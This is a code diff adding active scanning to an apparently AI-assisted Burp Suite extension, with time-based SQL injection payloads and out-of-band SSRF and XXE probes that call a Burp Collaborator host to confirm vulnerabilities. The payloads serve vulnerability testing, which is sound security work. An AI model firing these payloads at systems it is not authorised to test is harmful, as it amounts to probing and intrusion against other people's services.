@@ -84,10 +84,14 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import burp.api.montoya.core.Range;
+import burp.api.montoya.core.ByteArray;
 import burp.api.montoya.BurpExtension;
 import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.core.Registration;
 import burp.api.montoya.core.ToolType;
+import burp.api.montoya.collaborator.CollaboratorClient;
+import burp.api.montoya.collaborator.Interaction;
+import burp.api.montoya.collaborator.InteractionFilter;
 import burp.api.montoya.http.HttpService;
 import burp.api.montoya.http.handler.HttpHandler;
 import burp.api.montoya.http.handler.HttpRequestToBeSent;
@@ -134,6 +138,10 @@ public class AIAuditor implements BurpExtension, ContextMenuItemsProvider, ScanC
     private static final int DEFAULT_PASSIVE_MAX_BODY_KB = 256;
     /** Cap auto-executed PoC requests extracted from model output. */
     private static final int MAX_AUTO_POC_REQUESTS = 8;
+    private static final long TIMING_SQLI_DELAY_MS = 4500L;
+    private static final long TIMING_SQLI_THRESHOLD_MS = 3000L;
+    private static final int OOB_POLL_ROUNDS = 5;
+    private static final long OOB_POLL_SLEEP_MS = 1200L;
 
     /** Validation HTTP calls use short timeouts so the UI does not hang on unreachable hosts. */
     private static final int VALIDATION_CONNECT_MS = 15000;
@@ -173,6 +181,7 @@ public class AIAuditor implements BurpExtension, ContextMenuItemsProvider, ScanC
      private MontoyaApi api;
      private PersistedObject persistedData;
      private ThreadPoolManager threadPoolManager;
+    private CollaboratorClient collaboratorClient;
      private volatile boolean isShuttingDown = false;
      
      // UI Components
@@ -447,6 +456,13 @@ public class AIAuditor implements BurpExtension, ContextMenuItemsProvider, ScanC
 
         this.api = api;
         this.threadPoolManager = new ThreadPoolManager(api);    
+        try {
+            this.collaboratorClient = api.collaborator().createClient();
+            log("Collaborator client initialized for active OOB checks.", LogCategory.GENERAL);
+        } catch (Exception e) {
+            this.collaboratorClient = null;
+            api.logging().logToError("Collaborator client unavailable: " + e.getMessage());
+        }
         log("Extension initializing...", LogCategory.GENERAL);
 
         // Test preferences
@@ -3678,8 +3694,118 @@ private String getNextGeminiApiKey(boolean cycle) {
 
 @Override
 public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint auditInsertionPoint) {
-    // this extension doesn't implement active scanning (yet)
-    return AuditResult.auditResult(Collections.emptyList());
+    if (isShuttingDown || baseRequestResponse == null || baseRequestResponse.request() == null || auditInsertionPoint == null) {
+        return AuditResult.auditResult(Collections.emptyList());
+    }
+    HttpRequest baseRequest = baseRequestResponse.request();
+    if (passiveAiInScopeOnly && !api.scope().isInScope(baseRequest.url())) {
+        return AuditResult.auditResult(Collections.emptyList());
+    }
+
+    List<AuditIssue> issues = new ArrayList<>();
+    issues.addAll(runTimingSqliChecks(baseRequestResponse, baseRequest, auditInsertionPoint));
+    issues.addAll(runOobChecks(baseRequestResponse, baseRequest, auditInsertionPoint));
+    return AuditResult.auditResult(issues);
+}
+
+private List<AuditIssue> runTimingSqliChecks(HttpRequestResponse baseRequestResponse, HttpRequest baseRequest, AuditInsertionPoint insertionPoint) {
+    List<AuditIssue> issues = new ArrayList<>();
+    String[] timingPayloads = {
+            "'; WAITFOR DELAY '0:0:5'--",
+            "' OR SLEEP(5)-- ",
+            "'||(SELECT pg_sleep(5))--"
+    };
+    for (String payload : timingPayloads) {
+        try {
+            HttpRequest requestWithPayload = insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(payload));
+            long elapsed = sendForElapsedMs(requestWithPayload);
+            if (elapsed >= TIMING_SQLI_DELAY_MS) {
+                String detail = "Observed significant delay after SQL timing payload.\n\n"
+                        + "- Payload: `" + payload + "`\n"
+                        + "- Elapsed: `" + elapsed + " ms`\n"
+                        + "- Threshold: `" + TIMING_SQLI_THRESHOLD_MS + " ms`\n\n"
+                        + "This may indicate blind/time-based SQL injection.";
+                issues.add(new AIAuditIssue.Builder()
+                        .name("Possible time-based SQL injection (active check)")
+                        .detail(detail)
+                        .endpoint(baseRequest.url().toString())
+                        .severity(AuditIssueSeverity.MEDIUM)
+                        .confidence(AuditIssueConfidence.FIRM)
+                        .requestResponses(Collections.singletonList(baseRequestResponse))
+                        .modelUsed("scanner/active-check")
+                        .build());
+                break;
+            }
+        } catch (Exception e) {
+            log("Timing SQLi check failed: " + e.getMessage(), LogCategory.GENERAL);
+        }
+    }
+    return issues;
+}
+
+private List<AuditIssue> runOobChecks(HttpRequestResponse baseRequestResponse, HttpRequest baseRequest, AuditInsertionPoint insertionPoint) {
+    List<AuditIssue> issues = new ArrayList<>();
+    if (collaboratorClient == null) {
+        return issues;
+    }
+    String collabPayload = collaboratorClient.generatePayload().toString();
+    issues.addAll(runSingleOobCheck(baseRequestResponse, baseRequest, insertionPoint, "OOB SSRF", "http://" + collabPayload + "/ssrf", collabPayload));
+    issues.addAll(runSingleOobCheck(baseRequestResponse, baseRequest, insertionPoint, "OOB XXE",
+            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://" + collabPayload + "/xxe\">]><r>&xxe;</r>",
+            collabPayload));
+    return issues;
+}
+
+private List<AuditIssue> runSingleOobCheck(HttpRequestResponse baseRequestResponse, HttpRequest baseRequest, AuditInsertionPoint insertionPoint, String checkName, String payload, String collabPayload) {
+    List<AuditIssue> issues = new ArrayList<>();
+    try {
+        HttpRequest requestWithPayload = insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(payload));
+        api.http().sendRequest(requestWithPayload);
+        List<Interaction> interactions = pollCollaboratorInteractions(collabPayload);
+        if (!interactions.isEmpty()) {
+            String detail = "Out-of-band interaction confirmed via Burp Collaborator.\n\n"
+                    + "- Check: `" + checkName + "`\n"
+                    + "- Collaborator payload: `" + collabPayload + "`\n"
+                    + "- Interaction count: `" + interactions.size() + "`\n\n"
+                    + "This indicates server-side processing that triggered an external callback.";
+            issues.add(new AIAuditIssue.Builder()
+                    .name(checkName + " (active OOB check)")
+                    .detail(detail)
+                    .endpoint(baseRequest.url().toString())
+                    .severity(AuditIssueSeverity.HIGH)
+                    .confidence(AuditIssueConfidence.CERTAIN)
+                    .requestResponses(Collections.singletonList(baseRequestResponse))
+                    .modelUsed("scanner/active-check")
+                    .build());
+        }
+    } catch (Exception e) {
+        log(checkName + " check failed: " + e.getMessage(), LogCategory.GENERAL);
+    }
+    return issues;
+}
+
+private List<Interaction> pollCollaboratorInteractions(String payload) {
+    for (int i = 0; i < OOB_POLL_ROUNDS; i++) {
+        try {
+            List<Interaction> interactions = collaboratorClient.getInteractions(
+                    InteractionFilter.interactionPayloadFilter(payload));
+            if (interactions != null && !interactions.isEmpty()) {
+                return interactions;
+            }
+            Thread.sleep(OOB_POLL_SLEEP_MS);
+        } catch (Exception e) {
+            log("Collaborator poll failed: " + e.getMessage(), LogCategory.GENERAL);
+            break;
+        }
+    }
+    return Collections.emptyList();
+}
+
+private long sendForElapsedMs(HttpRequest request) throws Exception {
+    long start = System.nanoTime();
+    api.http().sendRequest(request);
+    long elapsedNs = System.nanoTime() - start;
+    return TimeUnit.NANOSECONDS.toMillis(elapsedNs);
 }
 
 @Override
